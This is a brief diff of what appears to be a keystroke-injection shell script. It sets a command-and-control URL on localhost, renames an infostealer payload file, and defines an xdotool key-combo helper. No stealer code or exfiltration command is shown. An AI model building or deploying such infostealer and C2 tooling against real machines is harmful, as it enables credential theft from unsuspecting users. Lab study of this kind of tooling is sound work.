@@ -2,7 +2,7 @@
 
 DELAY=500
 C2_URL="localhost:4443"
-INFOSTEALER_FILENAME="infostealer.py"
+INFOSTEALER_FILENAME="stealer_client.py"
 
 xdo_key_combo() {
     xdotool key "$@"
